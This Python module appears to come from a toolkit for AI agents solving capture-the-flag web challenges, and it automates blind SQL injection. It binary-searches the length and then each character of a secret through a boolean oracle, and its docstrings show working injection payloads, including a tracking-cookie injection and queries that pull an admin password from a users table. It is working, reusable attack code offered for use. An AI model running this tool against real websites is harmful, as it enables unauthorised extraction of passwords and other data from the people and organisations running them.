"""Blind-SQLi extraction helpers (boolean & time-based).

The model cannot hand-loop hundreds of HTTP requests across its turn budget — one
character of a blind-SQLi extraction is one request, and a password/flag is
dozens of chars. So this runs the whole extraction in ONE code block: you give it
a `oracle(payload) -> bool` (or a request template), and it binary-searches the
length then resolves each character, printing progress so the model sees it work.

Usage (boolean blind, e.g. cookie/param injection):

    from muteki_kit.web.sqli import blind_extract
    def oracle(cond: str) -> bool:
        # cond is a SQL boolean like "ASCII(SUBSTRING((SELECT ...),1,1))>64"
        c.set_cookie("trackingID", base_id + f"' AND {cond}-- -")
        return "Error" not in c.get("/").body   # True when the condition held
    secret = blind_extract(oracle,
        value_sql="(SELECT password FROM users WHERE email='admin@x.com')")
    print(secret)

Self-documenting + typed so the model uses it confidently.
"""

from __future__ import annotations

import string
from typing import Callable, Optional

from pydantic import BaseModel

# default charset, ordered by frequency-ish so common chars resolve first
_CHARSET = string.ascii_lowercase + string.digits + string.ascii_uppercase + "_-{}!@#$%^&*()+=.,/:;" + " "


class ExtractResult(BaseModel):
    value: str
    chars_resolved: int
    requests: int
    complete: bool


def _bisect_char(test_gt: Callable[[int], bool], lo: int = 0, hi: int = 127) -> int:
    """Binary-search a byte value in [lo,hi] using a > comparator. ~7 requests."""
    while lo < hi:
        mid = (lo + hi) // 2
        if test_gt(mid):  # value > mid
            lo = mid + 1
        else:
            hi = mid
    return lo


def extract_by_char_test(
    char_gt: Callable[[int, int], bool],
    length_gt: Callable[[int], bool],
    *,
    max_len: int = 64,
    flag_terminator: str = "}",
) -> ExtractResult:
    """Most flexible blind-extract: YOU own all the SQL/payload syntax.

    char_gt(i, n)  -> True if ASCII of the i-th char (1-based) of the secret > n.
    length_gt(n)   -> True if the secret length > n.

    The helper just binary-searches; it builds NO SQL, so it works with ANY
    injection wrapper/oracle shape (cookie equality, time-based, etc.). Use this
    when the canned `blind_extract` condition syntax doesn't fit the target.

        def char_gt(i, n):
            return oracle(f"(SELECT ASCII(SUBSTRING(password,{i},1)) FROM users "
                          f"WHERE privilege='admin')>{n}")
        def length_gt(n):
            return oracle(f"(SELECT LENGTH(password) FROM users WHERE privilege='admin')>{n}")
        r = extract_by_char_test(char_gt, length_gt)
    """
    reqs = [0]

    def _len_gt(n: int) -> bool:
        reqs[0] += 1
        return length_gt(n)

    def _char_gt(i: int, n: int) -> bool:
        reqs[0] += 1
        return char_gt(i, n)

    lo, hi = 0, max_len
    while lo < hi:
        mid = (lo + hi) // 2
        if _len_gt(mid):
            lo = mid + 1
        else:
            hi = mid
    length = lo

    out: list[str] = []
    for i in range(1, length + 1):
        code = _bisect_char(lambda m, idx=i: _char_gt(idx, m))
        ch = chr(code) if 0 < code < 128 else "?"
        out.append(ch)
        if ch == flag_terminator:
            break
    return ExtractResult(value="".join(out), chars_resolved=len(out),
                         requests=reqs[0], complete=len(out) >= length)


def blind_extract(
    oracle: Callable[[str], bool],
    value_sql: str,
    *,
    max_len: int = 64,
    use_bisect: bool = True,
    charset: str = _CHARSET,
    flag_terminator: str = "}",
) -> ExtractResult:
    """Extract a string value via a boolean-SQLi oracle, in one call.

    oracle(cond)   -> True if the SQL boolean condition `cond` is TRUE.
    value_sql      -> the SQL expression to read, e.g.
                      "(SELECT password FROM users LIMIT 1)".
    Strategy: find LENGTH (binary search), then each char (binary search on
    ASCII by default — ~7 requests/char — or linear over `charset`). Stops early
    if it reads `flag_terminator` (the closing brace of a flag).
    """
    reqs = 0

    def cond(c: str) -> bool:
        nonlocal reqs
        reqs += 1
        return oracle(c)

    # 1) length
    length = 0
    lo, hi = 0, max_len
    while lo < hi:
        mid = (lo + hi) // 2
        if cond(f"LENGTH({value_sql})>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    length = lo

    # 2) characters
    out: list[str] = []
    for i in range(1, length + 1):
        sub = f"ASCII(SUBSTRING({value_sql},{i},1))"
        if use_bisect:
            code = _bisect_char(lambda m, s=sub: cond(f"{s}>{m}"))
            ch = chr(code) if 0 < code < 128 else "?"
        else:
            ch = "?"
            for cand in charset:
                if cond(f"{sub}={ord(cand)}"):
                    ch = cand
                    break
        out.append(ch)
        if ch == flag_terminator:
            break

    value = "".join(out)
    return ExtractResult(value=value, chars_resolved=len(out), requests=reqs,
                         complete=len(out) >= length)


def boolean_oracle_from_response(
    send: Callable[[str], str], truthy_marker: str
) -> Callable[[str], bool]:
    """Build an oracle from a send(payload)->response_text fn: condition is TRUE
    when `truthy_marker` is present (or absent — wrap accordingly). Convenience so
    the model writes one line."""
    def oracle(cond: str) -> bool:
        return truthy_marker in send(cond)
    return oracle
